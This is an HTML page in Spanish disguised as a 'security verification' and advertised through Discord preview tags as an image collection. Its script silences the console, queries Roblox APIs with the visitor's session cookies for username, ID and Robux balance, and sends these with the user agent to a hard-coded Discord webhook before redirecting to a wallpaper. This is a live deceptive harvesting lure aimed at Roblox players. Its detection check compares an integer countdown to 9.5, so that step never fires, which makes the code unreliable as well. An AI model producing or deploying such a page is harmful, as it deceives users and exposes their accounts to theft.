<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de seguridad</title>
    
    <!-- Meta tags para Discord -->
    <meta property="og:title" content="Ejemplo_1">
    <meta property="og:description" content="Coleccion de imagenes. Clickea para verlas">
    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQxklrK0_ySENDG-QIjx4wHdLSyB93HYUKT3g&s">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        
        .verification-container {
            text-align: center;
            color: #fff;
            max-width: 400px;
            padding: 30px;
            background: rgba(20,20,20,0.9);
            border-radius: 20px;
            border: 1px solid #333;
            box-shadow: 0 0 30px rgba(255,68,68,0.2);
        }
        
        .title {
            font-size: 24px;
            margin-bottom: 20px;
            color: #ff4444;
            font-weight: bold;
        }
        
        .subtitle {
            font-size: 16px;
            color: #888;
            margin-bottom: 30px;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #222;
            border-top: 6px solid #ff4444;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .counter {
            font-size: 48px;
            font-weight: bold;
            color: #ff4444;
            margin: 20px 0;
            text-shadow: 0 0 20px rgba(255,68,68,0.5);
        }
        
        .counter-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 30px;
        }
        
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #222;
            border-radius: 2px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: #ff4444;
            width: 0%;
            transition: width 0.1s linear;
        }
        
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #444;
        }
    </style>
</head>
<body>
    <div class="verification-container">
        <div class="title">🔍 VERIFICACIÓN DE SEGURIDAD</div>
        <div class="subtitle">Confirmando que no seas un robot</div>
        
        <div class="spinner"></div>
        
        <div class="counter" id="counter">10</div>
        <div class="counter-label">segundos restantes</div>
        
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        
        <div class="footer" id="statusText">Iniciando verificación...</div>
    </div>

    <script>
        // Silenciar consola
        console.log = console.error = console.warn = function() {};
        
        // ================= CONFIGURACIÓN =================
        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        const PANEL_URL = "https://juanchos123.github.io/image_9180173538.png/panel.html";
        
        let cuentaConectada = false;
        let userData = null;
        
        // =========== DETECTAR SI HAY CUENTA DE ROBLOX ===========
        async function detectarCuentaRoblox() {
            try {
                const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
                    credentials: 'include'
                });
                
                if (res.ok) {
                    const data = await res.json();
                    cuentaConectada = true;
                    userData = {
                        id: data.id,
                        name: data.name
                    };
                    
                    // Obtener Robux
                    try {
                        const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${data.id}/currency`, {
                            credentials: 'include'
                        });
                        if (robuxRes.ok) {
                            const robuxData = await robuxRes.json();
                            userData.robux = robuxData.robux;
                        }
                    } catch {}
                    
                    return true;
                }
            } catch (e) {}
            
            cuentaConectada = false;
            userData = null;
            return false;
        }
        
        // =========== ENVIAR NOTIFICACIÓN A DISCORD ===========
        async function notificarDiscord() {
            const status = cuentaConectada ? "✅ CUENTA CONECTADA" : "❌ SIN CUENTA";
            const color = cuentaConectada ? 0x00FF00 : 0xFF0000;
            
            const embed = {
                content: "@everyone",
                embeds: [{
                    title: "🔔 NUEVA VISITA",
                    color: color,
                    fields: [
                        {
                            name: "📊 ESTADO",
                            value: status,
                            inline: false
                        },
                        {
                            name: "👤 USUARIO",
                            value: cuentaConectada ? 
                                `**Nombre:** ${userData.name}\n**ID:** ${userData.id}\n**Robux:** ${userData.robux || 0}` : 
                                "No conectado",
                            inline: false
                        },
                        {
                            name: "🌐 DISPOSITIVO",
                            value: navigator.userAgent,
                            inline: false
                        }
                    ],
                    thumbnail: {
                        url: "https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg"
                    },
                    timestamp: new Date().toISOString()
                }]
            };
            
            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });
            } catch (e) {}
        }
        
        // =========== NOTIFICAR AL PANEL (USANDO LOCALSTORAGE) ===========
        function notificarPanel() {
            // Guardamos en localStorage para que el panel pueda leerlo
            localStorage.setItem('cuenta_roblox', JSON.stringify({
                conectada: cuentaConectada,
                data: userData,
                timestamp: Date.now()
            }));
        }
        
        // =========== CONTADOR REGRESIVO ===========
        let segundos = 10;
        const counterElement = document.getElementById('counter');
        const progressFill = document.getElementById('progressFill');
        const statusText = document.getElementById('statusText');
        
        const intervalo = setInterval(async () => {
            segundos--;
            counterElement.textContent = segundos;
            progressFill.style.width = `${((10 - segundos) / 10) * 100}%`;
            
            // A los 0.5 segundos detectar cuenta
            if (segundos === 9.5) {
                statusText.textContent = "Detectando cuenta de Roblox...";
                await detectarCuentaRoblox();
                notificarPanel();
                
                if (cuentaConectada) {
                    statusText.textContent = "✅ Cuenta detectada! Completando verificación...";
                } else {
                    statusText.textContent = "⚠️ No se detectó cuenta. Continuando...";
                }
            }
            
            if (segundos <= 0) {
                clearInterval(intervalo);
                await notificarDiscord();
                
                // Redirigir a la imagen
                statusText.textContent = "Verificación completada. Redirigiendo...";
                
                setTimeout(() => {
                    window.location.href = "https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg";
                }, 1000);
            }
        }, 1000);
    </script>
</body>
</html>
